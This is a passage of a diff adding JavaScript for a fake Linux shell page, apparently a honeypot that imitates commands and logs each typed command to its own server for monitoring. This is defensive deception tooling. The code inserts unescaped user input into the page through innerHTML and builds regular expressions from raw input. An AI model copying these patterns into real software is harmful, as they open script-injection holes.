+                    return 'file';
+                }
+            }
+            return 'file';
+        }
+        
+        // cat command
+        function cat(args) {
+            if (args.length === 0) {
+                return '<span class="error">cat: missing file operand</span>';
+            }
+            
+            const path = args[0];
+            const resolvedPath = resolvePath(currentDir, path);
+            const file = getDirectory(resolvedPath);
+            
+            if (!file) {
+                return `<span class="error">cat: ${path}: No such file or directory</span>`;
+            }
+            
+            if (file.type === 'dir') {
+                return `<span class="error">cat: ${path}: Is a directory</span>`;
+            }
+            
+            // For binary files, just show a message
+            if (file.content.startsWith('Binary file:')) {
+                return `<span class="warning">${file.content}</span>`;
+            }
+            
+            return file.content;
+        }
+        
+        // pwd command
+        function pwd() {
+            return currentDir;
+        }
+        
+        // whoami command
+        function whoami() {
+            return username;
+        }
+        
+        // echo command
+        function echo(args) {
+            return args.join(' ');
+        }
+        
+        // exit command
+        function exit() {
+            return '<span class="success">logout</span>';
+        }
+        
+        // date command
+        function getDate() {
+            const date = new Date();
+            return date.toString();
+        }
+        
+        // id command
+        function getId() {
+            return `uid=1000(${username}) gid=1000(${username}) groups=1000(${username}),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)`;
+        }
+        
+        // uname command
+        function uname(args) {
+            let output = 'Linux';
+            
+            if (args.includes('-a')) {
+                output = `Linux ${hostname} 5.15.0-76-generic #83-Ubuntu SMP Wed Apr 12 14:35:38 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux`;
+            } else if (args.includes('-r')) {
+                output = '5.15.0-76-generic';
+            } else if (args.includes('-n')) {
+                output = hostname;
+            } else if (args.includes('-m')) {
+                output = 'x86_64';
+            }
+            
+            return output;
+        }
+        
+        // grep command
+        function grep(args) {
+            if (args.length < 2) {
+                return '<span class="error">grep: missing pattern and file operand</span>';
+            }
+            
+            // Get pattern and file path
+            const pattern = args[0];
+            const filePath = args[args.length - 1];
+            
+            // Skip options for simplicity
+            let ignoreCase = false;
+            for (let i = 0; i < args.length - 1; i++) {
+                if (args[i] === '-i') {
+                    ignoreCase = true;
+                }
+            }
+            
+            // Get file content
+            const resolvedPath = resolvePath(currentDir, filePath);
+            const file = getDirectory(resolvedPath);
+            
+            if (!file) {
+                return `<span class="error">grep: ${filePath}: No such file or directory</span>`;
+            }
+            
+            if (file.type === 'dir') {
+                return `<span class="error">grep: ${filePath}: Is a directory</span>`;
+            }
+            
+            // For binary files, don't grep
+            if (file.content.startsWith('Binary file:')) {
+                return `<span class="warning">Binary file ${filePath} matches</span>`;
+            }
+            
+            // Search for the pattern in the file content
+            const lines = file.content.split('\n');
+            const matches = [];
+            
+            for (const line of lines) {
+                const searchLine = ignoreCase ? line.toLowerCase() : line;
+                const searchPattern = ignoreCase ? pattern.toLowerCase() : pattern;
+                
+                if (searchLine.includes(searchPattern)) {
+                    // Highlight the pattern in the line
+                    const highlightedLine = line.replace(
+                        new RegExp(pattern, ignoreCase ? 'gi' : 'g'),
+                        match => `<span class="highlight">${match}</span>`
+                    );
+                    matches.push(highlightedLine);
+                }
+            }
+            
+            if (matches.length === 0) {
+                return '';
+            }
+            
+            return matches.join('\n');
+        }
+        
+        // find command
+        function find(args) {
+            if (args.length === 0) {
+                return '<span class="error">find: missing path argument</span>';
+            }
+            
+            // Simplistic implementation for honeypot
+            const path = args[0];
+            const resolvedPath = resolvePath(currentDir, path);
+            
+            const namePattern = args.includes('-name') ? args[args.indexOf('-name') + 1].replace(/[*]/g, '.*').replace(/[?]/g, '.') : null;
+            const typeFilter = args.includes('-type') ? args[args.indexOf('-type') + 1] : null;
+            
+            return findRecursive(resolvedPath, namePattern, typeFilter, resolvedPath);
+        }
+        
+        function findRecursive(rootPath, namePattern, typeFilter, currentPath) {
+            const dir = getDirectory(currentPath);
+            
+            if (!dir) {
+                return `<span class="error">find: '${rootPath}': No such file or directory</span>`;
+            }
+            
+            let output = [];
+            
+            // If directory, recursively search
+            if (dir.type === 'dir') {
+                // Add current directory if it matches
+                const baseName = currentPath.split('/').pop();
+                const isMatch = !namePattern || new RegExp('^' + namePattern + '$').test(baseName);
+                const matchesType = !typeFilter || (typeFilter === 'd' && dir.type === 'dir');
+                
+                if (isMatch && matchesType) {
+                    output.push(currentPath);
+                }
+                
+                // Check children
+                for (const name in dir.children) {
+                    const childPath = currentPath + (currentPath.endsWith('/') ? '' : '/') + name;
+                    const child = dir.children[name];
+                    
+                    // Check if this file/directory matches
+                    const isChildMatch = !namePattern || new RegExp('^' + namePattern + '$').test(name);
+                    const childMatchesType = !typeFilter || 
+                                          (typeFilter === 'f' && child.type === 'file') || 
+                                          (typeFilter === 'd' && child.type === 'dir');
+                    
+                    if (isChildMatch && childMatchesType) {
+                        output.push(childPath);
+                    }
+                    
+                    // Recursively search directories
+                    if (child.type === 'dir') {
+                        output = output.concat(findRecursive(rootPath, namePattern, typeFilter, childPath).split('\n'));
+                    }
+                }
+            } else if (dir.type === 'file') {
+                // Check if file matches
+                const baseName = currentPath.split('/').pop();
+                const isMatch = !namePattern || new RegExp('^' + namePattern + '$').test(baseName);
+                const matchesType = !typeFilter || (typeFilter === 'f' && dir.type === 'file');
+                
+                if (isMatch && matchesType) {
+                    output.push(currentPath);
+                }
+            }
+            
+            return output.filter(Boolean).join('\n');
+        }
+        
+        // touch command
+        function touch(args) {
+            if (args.length === 0) {
+                return '<span class="error">touch: missing file operand</span>';
+            }
+            
+            return '<span class="error">touch: cannot touch file: Permission denied</span>';
+        }
+        
+        // mkdir command
+        function mkdir(args) {
+            if (args.length === 0) {
+                return '<span class="error">mkdir: missing operand</span>';
+            }
+            
+            return '<span class="error">mkdir: cannot create directory: Permission denied</span>';
+        }
+        
+        // rm command
+        function rm(args) {
+            if (args.length === 0) {
+                return '<span class="error">rm: missing operand</span>';
+            }
+            
+            return '<span class="error">rm: cannot remove file: Permission denied</span>';
+        }
+        
+        // cp command
+        function cp(args) {
+            if (args.length < 2) {
+                return '<span class="error">cp: missing source or destination file operand</span>';
+            }
+            
+            return '<span class="error">cp: cannot copy: Permission denied</span>';
+        }
+        
+        // mv command
+        function mv(args) {
+            if (args.length < 2) {
+                return '<span class="error">mv: missing source or destination file operand</span>';
+            }
+            
+            return '<span class="error">mv: cannot move: Permission denied</span>';
+        }
+        
+        // history command
+        function showHistory() {
+            let output = '';
+            for (let i = 0; i < commandHistory.length; i++) {
+                output += `${i + 1}  ${commandHistory[i]}\n`;
+            }
+            return output;
+        }
+        
+        // sudo command
+        function sudo(args) {
+            if (args.length === 0) {
+                return '<span class="error">sudo: no command specified</span>';
+            }
+            
+            if (args[0] === 'su' && args.length === 1) {
+                return `<span class="error">sudo: su command not allowed</span>`;
+            }
+            
+            if (args.join(' ') === 'make me a sandwich') {
+                return '<span class="success">Okay.</span>';
+            }
+            
+            return `<span class="error">${username} is not in the sudoers file. This incident will be reported.</span>`;
+        }
+        
+        // ps command
+        function ps(args) {
+            const showAll = args.includes('-a') || args.includes('-aux') || args.includes('-ef');
+            
+            let output = '  PID TTY          TIME CMD\n';
+            
+            if (showAll) {
+                output = '  PID TTY          STAT   TIME COMMAND\n';
+                output += '    1 ?            Ss     0:02 /sbin/init\n';
+                output += '    2 ?            S      0:00 [kthreadd]\n';
+                output += '  324 ?            Ss     0:00 /usr/sbin/sshd -D\n';
+                output += '  346 ?            Ss     0:01 /usr/sbin/apache2 -k start\n';
+                output += '  388 ?            S      0:00 /usr/sbin/apache2 -k start\n';
+                output += '  389 ?            S      0:00 /usr/sbin/apache2 -k start\n';
+                output += '  420 ?            Ss     0:00 /usr/sbin/cron -f\n';
+                output += '  589 ?            Ss     0:00 /lib/systemd/systemd --user\n';
+                output += `  603 pts/0        Ss     0:00 -bash\n`;
+                output += `${1000 + Math.floor(Math.random() * 1000)} pts/0        R+     0:00 ps ${args.join(' ')}\n`;
+            } else {
+                output += `  603 pts/0        00:00:00 bash\n`;
+                output += `${1000 + Math.floor(Math.random() * 1000)} pts/0        00:00:00 ps\n`;
+            }
+            
+            return output;
+        }
+        
+        // top command
+        function top() {
+            let output = '';
+            output += 'top - 00:30:12 up  3:42,  1 user,  load average: 0.08, 0.03, 0.01\n';
+            output += 'Tasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n';
+            output += '%Cpu(s):  2.0 us,  1.0 sy,  0.0 ni, 96.8 id,  0.2 wa,  0.0 hi,  0.0 si,  0.0 st\n';
+            output += 'MiB Mem :   3919.7 total,   2135.5 free,    903.7 used,    880.5 buff/cache\n';
+            output += 'MiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   2760.2 avail Mem\n\n';
+            output += '  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n';
+            output += '  346 root      20   0  224996   9960   6744 S   0.3   0.2   0:02.87 apache2\n';
+            output += '  324 root      20   0   16164   9604   7984 S   0.0   0.2   0:00.60 sshd\n';
+            output += '    1 root      20   0  168908  10816   8352 S   0.0   0.3   0:02.52 systemd\n';
+            output += '  420 root      20   0   14864   2364   2044 S   0.0   0.1   0:00.14 cron\n';
+            output += `  603 ${username.padEnd(8)}  20   0   16836   3464   2924 S   0.0   0.1   0:00.45 bash\n`;
+            
+            return output;
+        }
+        
+        // df command
+        function df(args) {
+            const humanReadable = args.includes('-h');
+            
+            let output = '';
+            
+            if (humanReadable) {
+                output += 'Filesystem      Size  Used Avail Use% Mounted on\n';
+                output += '/dev/sda1        20G  4.5G   15G  24% /\n';
+                output += 'tmpfs           393M  1.2M  392M   1% /run\n';
+                output += 'tmpfs           1.9G     0  1.9G   0% /dev/shm\n';
+                output += 'tmpfs           5.0M  4.0K  5.0M   1% /run/lock\n';
+                output += '/dev/sda2        20G   13G  6.3G  68% /data\n';
+            } else {
+                output += 'Filesystem     1K-blocks     Used Available Use% Mounted on\n';
+                output += '/dev/sda1       20961280  4720548  15170896  24% /\n';
+                output += 'tmpfs             402432     1228    401204   1% /run\n';
+                output += 'tmpfs            2012148        0   2012148   0% /dev/shm\n';
+                output += 'tmpfs               5120        4      5116   1% /run/lock\n';
+                output += '/dev/sda2       20961280 13107692   6614452  68% /data\n';
+            }
+            
+            return output;
+        }
+        
+        // du command
+        function du(args) {
+            const humanReadable = args.includes('-h');
+            const summarize = args.includes('-s');
+            
+            let path = '.';
+            let pathIndex = -1;
+            
+            // Find path argument
+            for (let i = 0; i < args.length; i++) {
+                if (!args[i].startsWith('-')) {
+                    path = args[i];
+                    pathIndex = i;
+                    break;
+                }
+            }
+            
+            // Get directory
+            const resolvedPath = resolvePath(currentDir, path);
+            const dir = getDirectory(resolvedPath);
+            
+            if (!dir) {
+                return `<span class="error">du: cannot access '${path}': No such file or directory</span>`;
+            }
+            
+            if (dir.type !== 'dir') {
+                if (humanReadable) {
+                    return `4.0K\t${path}`;
+                } else {
+                    return `4\t${path}`;
+                }
+            }
+            
+            if (summarize) {
+                if (humanReadable) {
+                    return `8.0K\t${path}`;
+                } else {
+                    return `8\t${path}`;
+                }
+            }
+            
+            let output = '';
+            
+            for (const name in dir.children) {
+                const child = dir.children[name];
+                const childPath = path + (path.endsWith('/') ? '' : '/') + name;
+                
+                if (child.type === 'dir') {
+                    if (humanReadable) {
+                        output += `4.0K\t${childPath}\n`;
+                    } else {
+                        output += `4\t${childPath}\n`;
+                    }
+                } else {
+                    if (humanReadable) {
+                        output += `4.0K\t${childPath}\n`;
+                    } else {
+                        output += `4\t${childPath}\n`;
+                    }
+                }
+            }
+            
+            if (humanReadable) {
+                output += `8.0K\t${path}`;
+            } else {
+                output += `8\t${path}`;
+            }
+            
+            return output;
+        }
+        
+        // Text editor simulation
+        function editor(filePath) {
+            if (!filePath) {
+                return '<span class="error">No file specified</span>';
+            }
+            
+            return '<span class="warning">Editor not available in this terminal</span>';
+        }
+        
+        // wget/curl command
+        function download(args) {
+            if (args.length === 0) {
+                return '<span class="error">No URL specified</span>';
+            }
+            
+            return '<span class="error">Network access restricted in this terminal</span>';
+        }
+        
+        // ssh command
+        function ssh(args) {
+            if (args.length === 0) {
+                return '<span class="error">No host specified</span>';
+            }
+            
+            return '<span class="error">ssh: connect to host ' + args[0] + ' port 22: Connection refused</span>';
+        }
+        
+        // chmod command
+        function chmod(args) {
+            if (args.length < 2) {
+                return '<span class="error">chmod: missing operand</span>';
+            }
+            
+            return '<span class="error">chmod: changing permissions of \'' + args[1] + '\': Operation not permitted</span>';
+        }
+        
+        // chown command
+        function chown(args) {
+            if (args.length < 2) {
+                return '<span class="error">chown: missing operand</span>';
+            }
+            
+            return '<span class="error">chown: changing ownership of \'' + args[1] + '\': Operation not permitted</span>';
+        }
+        
+        // man command
+        function man(command) {
+            if (!command) {
+                return '<span class="error">What manual page do you want?</span>';
+            }
+            
+            // Simple man pages for common commands
+            const manPages = {
+                'ls': `<span class="highlight">NAME</span>
+       ls - list directory contents
+
+<span class="highlight">SYNOPSIS</span>
+       ls [OPTION]... [FILE]...
+
+<span class="highlight">DESCRIPTION</span>
+       List information about the FILEs (the current directory by default).
+       Sort entries alphabetically.
+
+       -a, --all
+              do not ignore entries starting with .
+
+       -l     use a long listing format`,
+                'cd': `<span class="highlight">NAME</span>
+       cd - change directory
+
+<span class="highlight">SYNOPSIS</span>
+       cd [directory]
+
+<span class="highlight">DESCRIPTION</span>
+       Change the current directory to directory.  The default directory is the value of the
+       HOME shell variable.`,
+                'cat': `<span class="highlight">NAME</span>
+       cat - concatenate files and print on the standard output
+
+<span class="highlight">SYNOPSIS</span>
+       cat [OPTION]... [FILE]...
+
+<span class="highlight">DESCRIPTION</span>
+       Concatenate FILE(s) to standard output.
+
+       With no FILE, or when FILE is -, read standard input.`,
+                'pwd': `<span class="highlight">NAME</span>
+       pwd - print name of current/working directory
+
+<span class="highlight">SYNOPSIS</span>
+       pwd [OPTION]...
+
+<span class="highlight">DESCRIPTION</span>
+       Print the full filename of the current working directory.`,
+                'man': `<span class="highlight">NAME</span>
+       man - an interface to the system reference manuals
+
+<span class="highlight">SYNOPSIS</span>
+       man [option...] [section] name...
+
+<span class="highlight">DESCRIPTION</span>
+       man is the system's manual pager. Each page argument given is normally the name of a
+       program, utility or function.`
+            };
+            
+            if (manPages[command]) {
+                return manPages[command];
+            } else {
+                return `<span class="error">No manual entry for ${command}</span>`;
+            }
+        }
+        
+        // Run matrix effect
+        function runMatrix() {
+            // Clear any existing matrix effect
+            if (matrixInterval) {
+                clearInterval(matrixInterval);
+                // Remove existing matrix characters
+                const existingChars = document.querySelectorAll('.matrix-char');
+                existingChars.forEach(char => char.remove());
+            }
+            
+            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%^&*()_+~{}|:<>?";
+            const numChars = 100; // Number of falling characters
+            
+            // Create characters
+            for (let i = 0; i < numChars; i++) {
+                createMatrixChar();
+            }
+            
+            // Create interval to continuously add more characters
+            matrixInterval = setInterval(() => {
+                createMatrixChar();
+                
+                // Randomly remove some characters to prevent too many
+                if (document.querySelectorAll('.matrix-char').length > 300) {
+                    const chars = document.querySelectorAll('.matrix-char');
+                    const removeCount = Math.min(10, chars.length - 290);
+                    for (let i = 0; i < removeCount; i++) {
+                        if (chars[i]) chars[i].remove();
+                    }
+                }
+            }, 200);
+            
+            function createMatrixChar() {
+                const char = document.createElement('div');
+                char.className = 'matrix-char';
+                char.textContent = chars.charAt(Math.floor(Math.random() * chars.length));
+                
+                // Random position
+                const xPos = Math.random() * window.innerWidth;
+                char.style.left = xPos + 'px';
+                
+                // Random animation duration between 2-8 seconds
+                const duration = 2 + Math.random() * 6;
+                char.style.animationDuration = duration + 's';
+                
+                document.body.appendChild(char);
+                
+                // Remove after animation completes
+                setTimeout(() => {
+                    if (char.parentNode) {
+                        char.parentNode.removeChild(char);
+                    }
+                }, duration * 1000);
+            }
+            
+            return '<span class="success">Welcome to The Matrix. Press Ctrl+C to exit.</span>';
+        }
+        
+        // Cowsay command
+        function cowsay(args) {
+            const message = args.join(' ') || 'Moo!';
+            
+            let output = ' ';
+            for (let i = 0; i < message.length + 2; i++) {
+                output += '_';
+            }
+            output += '\n';
+            output += '< ' + message + ' >\n';
+            output += ' ';
+            for (let i = 0; i < message.length + 2; i++) {
+                output += '-';
+            }
+            output += '\n';
+            output += '        \\   ^__^\n';
+            output += '         \\  (oo)\\_______\n';
+            output += '            (__)\\       )\\/\\\n';
+            output += '                ||----w |\n';
+            output += '                ||     ||\n';
+            
+            return output;
+        }
+        
+        // Rev command (reverse text)
+        function rev(args) {
+            if (args.length === 0) {
+                return '<span class="error">No input provided</span>';
+            }
+            
+            const text = args.join(' ');
+            return text.split('').reverse().join('');
+        }
+        
+        // sl command (ASCII steam locomotive)
+        function sl() {
+            let output = '';
+            output += '                         (  ) (@@) ( )  (@)  ()    @@    O     @     O     @     O      @\n';
+            output += '                    (@@@)\n';
+            output += '                (    )\n';
+            output += '              (@@@@)\n';
+            output += '            (   )\n';
+            output += '           (@@@)\n';
+            output += '        ====        ________                ___________\n';
+            output += '    _D _|  |_______/        \\__I_I_____===__|_________|\n';
+            output += '     |(_)---  |   H\\________/ |   |        =|___ ___|      __________________\n';
+            output += '     /     |  |   H  |  |     |   |         ||_| |_||     _|\n';
+            output += '    |      |  |   H  |__--------------------| [___] |   =|\n';
+            output += '    | ________|___H__/__|_____/[][]~\\_______|       |   -|\n';
+            output += '    |/ |   |-----------I_____I [][] []  D   |=======|____|_________________\n';
+            output += "  __/ =| o |=-~~\\  /~~\\  /~~\\  /~~\\ ____Y___________|__|___________________\n";
+            output += ' |/-=|___||    ||    ||    ||    |_____/~\\___/          |_D__D__D_|  |_D__D__D_|\n';
+            output += '  \\_/      \\__/  \\__/  \\__/  \\__/      \\_/               \\_/   \\_/    \\_/   \\_/\n';
+            
+            return output;
+        }
+        
+        // banner command (ASCII art text)
+        function banner(args) {
+            if (args.length === 0) {
+                return '<span class="error">No text provided</span>';
+            }
+            
+            const text = args.join(' ');
+            
+            if (text.length > 10) {
+                return '<span class="error">Text too long for banner</span>';
+            }
+            
+            let output = '';
+            
+            // Simple ASCII art banner
+            for (let line = 0; line < 7; line++) {
+                for (let char of text) {
+                    output += getBannerChar(char, line);
+                }
+                output += '\n';
+            }
+            
+            return output;
+        }
+        
+        // Helper for banner command - returns the line for a character
+        function getBannerChar(char, line) {
+            const bannerChars = {
+                'A': [
+                    '  #  ',
+                    ' # # ',
+                    '#   #',
+                    '#####',
+                    '#   #',
+                    '#   #',
+                    '#   #'
+                ],
+                'B': [
+                    '#### ',
+                    '#   #',
+                    '#   #',
+                    '#### ',
+                    '#   #',
+                    '#   #',
+                    '#### '
+                ],
+                'C': [
+                    ' ####',
+                    '#    ',
+                    '#    ',
+                    '#    ',
+                    '#    ',
+                    '#    ',
+                    ' ####'
+                ],
+                '1': [
+                    '  #  ',
+                    ' ##  ',
+                    '# #  ',
+                    '  #  ',
+                    '  #  ',
+                    '  #  ',
+                    '#####'
+                ],
+                '2': [
+                    ' ### ',
+                    '#   #',
+                    '    #',
+                    '   # ',
+                    '  #  ',
+                    ' #   ',
+                    '#####'
+                ],
+                '3': [
+                    '#####',
+                    '    #',
+                    '   # ',
+                    ' ### ',
+                    '    #',
+                    '#   #',
+                    ' ### '
+                ]
+            };
+            
+            // Default character for unknown chars
+            const defaultChar = [
+                '     ',
+                '     ',
+                '     ',
+                '     ',
+                '     ',
+                '     ',
+                '     '
+            ];
+            
+            // Get the banner character or use default
+            const banner = bannerChars[char.toUpperCase()] || defaultChar;
+            return banner[line] + ' ';
+        }
+        
+        // fortune command (random messages)
+        function fortune() {
+            const fortunes = [
+                "You will find a hidden treasure where you least expect it.",
+                "A journey of a thousand miles begins with a single step.",
+                "The greatest danger could be your stupidity.",
+                "Help! I'm being held prisoner in a fortune cookie factory!",
+                "You will be successful in your work.",
+                "You have an unusual equipment for success. Use it properly.",
+                "You will soon embark on a business venture.",
+                "You have a deep interest in all that is artistic.",
+                "Error 404: Fortune not found.",
+                "The road to success is always under construction.",
+                "Don't panic.",
+                "Today is the first day of the rest of your life."
+            ];
+            
+            return fortunes[Math.floor(Math.random() * fortunes.length)];
+        }
+        
+        // Show help text
+        function showHelp() {
+            return `Available commands:
+<span class="help-command">ls</span> <span class="help-args">[-la] [directory]</span> - <span class="help-desc">List directory contents</span>
+<span class="help-command">cd</span> <span class="help-args">[directory]</span> - <span class="help-desc">Change the current directory</span>
+<span class="help-command">pwd</span> - <span class="help-desc">Print the current working directory</span>
+<span class="help-command">cat</span> <span class="help-args">[file]</span> - <span class="help-desc">Display file contents</span>
+<span class="help-command">whoami</span> - <span class="help-desc">Display current user</span>
+<span class="help-command">echo</span> <span class="help-args">[text]</span> - <span class="help-desc">Display a line of text</span>
+<span class="help-command">clear</span> - <span class="help-desc">Clear the terminal screen</span>
+<span class="help-command">exit</span> - <span class="help-desc">Exit the shell</span>
+<span class="help-command">date</span> - <span class="help-desc">Display the current date and time</span>
+<span class="help-command">id</span> - <span class="help-desc">Display user identity</span>
+<span class="help-command">uname</span> <span class="help-args">[-a]</span> - <span class="help-desc">Display system information</span>
+<span class="help-command">grep</span> <span class="help-args">[pattern] [file]</span> - <span class="help-desc">Search for a pattern in a file</span>
+<span class="help-command">find</span> <span class="help-args">[path] [-name pattern] [-type f|d]</span> - <span class="help-desc">Search for files</span>
+<span class="help-command">history</span> - <span class="help-desc">Display command history</span>
+<span class="help-command">ps</span> <span class="help-args">[-a] [-aux]</span> - <span class="help-desc">Report process status</span>
+<span class="help-command">top</span> - <span class="help-desc">Display system tasks</span>
+<span class="help-command">df</span> <span class="help-args">[-h]</span> - <span class="help-desc">Report file system disk space usage</span>
+<span class="help-command">du</span> <span class="help-args">[-h] [-s] [path]</span> - <span class="help-desc">Estimate file space usage</span>
+
+Fun commands:
+<span class="help-command">matrix</span> - <span class="help-desc">Display a matrix-like animation</span>
+<span class="help-command">cowsay</span> <span class="help-args">[message]</span> - <span class="help-desc">A cow saying your message</span>
+<span class="help-command">sl</span> - <span class="help-desc">Steam locomotive</span>
+<span class="help-command">banner</span> <span class="help-args">[text]</span> - <span class="help-desc">Display text in large letters</span>
+<span class="help-command">fortune</span> - <span class="help-desc">Print a random fortune</span>
+
+Note: Some commands may be restricted due to permissions.`;
+        }
+        
+        // Log interaction with honeypot
+        function logInteraction(command) {
+            // Send the interaction data to the server
+            fetch('/honeypot/log-interaction', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    page_type: 'terminal_shell',
+                    interaction_type: 'terminal_command',
+                    additional_data: {
+                        command: command,
+                        current_directory: currentDir,
+                        timestamp: new Date().toISOString()
+                    }
+                })
+            }).catch(() => {
+                // Ignore errors since this is just logging
+            });
+        }
+        
+        // Create a new line with command prompt
+        function createPrompt() {
+            const promptString = `<div id="input-line"><span id="prompt"><span id="prompt-user">${username}</span>@<span id="prompt-host">${hostname}</span>:<span id="prompt-path">${currentDir}</span>$</span> <input type="text" id="input" autofocus></div>`;
+            terminal.insertAdjacentHTML('beforeend', promptString);
+            document.getElementById('input').focus();
+        }
+        
+        // Initialize the terminal
+        createPrompt();
+        
+        // Event listeners
+        document.getElementById('input').addEventListener('keydown', function(event) {
+            if (event.key === 'Enter') {
+                // Get the command
+                const command = this.value;
+                
+                // Create a new output line with the command
+                const cmdLine = document.getElementById('input-line');
+                cmdLine.removeChild(document.getElementById('input'));
+                cmdLine.innerHTML += command;
+                cmdLine.id = '';
+                
+                // Execute the command
+                const output = executeCommand(command);
+                if (output) {
+                    terminal.insertAdjacentHTML('beforeend', `<div class="output">${output}</div>`);
+                }
+                
+                // Create a new prompt
+                createPrompt();
+                
+                // Scroll to the bottom
+                terminal.scrollTop = terminal.scrollHeight;
+            } else if (event.key === 'ArrowUp') {
+                event.preventDefault();
+                
+                // Navigate command history
+                if (historyIndex > 0) {
+                    historyIndex--;
+                    this.value = commandHistory[historyIndex];
+                }
+            } else if (event.key === 'ArrowDown') {
+                event.preventDefault();
+                
+                // Navigate command history
+                if (historyIndex < commandHistory.length) {
+                    historyIndex++;
+                    this.value = historyIndex === commandHistory.length ? '' : commandHistory[historyIndex];
+                }
+            } else if (event.key === 'Tab') {
+                event.preventDefault();
+                
+                // Very basic tab completion for paths
+                const command = this.value.trim();
+                
+                // Only try to complete if the command has at least one character
+                if (command.length > 0) {
+                    // Check if we're at a path that might need completion
+                    const parts = command.split(' ');
+                    const lastPart = parts[parts.length - 1];
+                    
+                    // Only try to complete if the last part looks like a path
+                    if (!lastPart.startsWith('-')) {
+                        const path = lastPart;
+                        const directoryPath = path.split('/').slice(0, -1).join('/');
+                        const fileName = path.split('/').pop();
+                        
+                        // Get the directory to search in
+                        let searchDir;
+                        if (directoryPath === '') {
+                            searchDir = getDirectory(currentDir);
+                        } else {
+                            const resolvedPath = resolvePath(currentDir, directoryPath);
+                            searchDir = getDirectory(resolvedPath);
+                        }
+                        
+                        // If we have a directory to search in
+                        if (searchDir && searchDir.type === 'dir') {
+                            // Find matching files/directories
+                            const matches = [];
+                            for (const name in searchDir.children) {
+                                if (name.startsWith(fileName)) {
+                                    matches.push(name);
+                                }
+                            }
+                            
+                            // If we have exactly one match, complete it
+                            if (matches.length === 1) {
+                                const completion = matches[0];
+                                
+                                // Replace the last part with the completion
+                                parts[parts.length - 1] = directoryPath ? directoryPath + '/' + completion : completion;
+                                
+                                // Add a trailing slash if it's a directory
+                                if (searchDir.children[completion].type === 'dir') {
+                                    parts[parts.length - 1] += '/';
+                                }
+                                
+                                this.value = parts.join(' ');
+                            }
+                        }
+                    }
+                }
+            } else if (event.key === 'c' && event.ctrlKey) {
+                // Clear any matrix effect
+                if (matrixInterval) {
+                    clearInterval(matrixInterval);
+                    matrixInterval = null;
+                    
+                    // Remove all matrix characters
+                    const matrixChars = document.querySelectorAll('.matrix-char');
+                    matrixChars.forEach(char => char.remove());
+                }
+                
+                // Add ^C to the current line
+                this.value += '^C';
+                document.getElementById('input-line').removeChild(document.getElementById('input'));
+                document.getElementById('input-line').innerHTML += '^C';
+                document.getElementById('input-line').id = '';
+                
+                // Create a new prompt
+                createPrompt();
+            }
+        });
+        
+        // Handle terminal focus
+        terminal.addEventListener('click', function() {
+            const input = document.getElementById('input');
+            if (input) {
+                input.focus();
+            }
+        });
+        
+        // Handle resize
+        window.addEventListener('resize', function() {
+            terminal.scrollTop = terminal.scrollHeight;
+        });
+    </script>
+</body>
+</html>
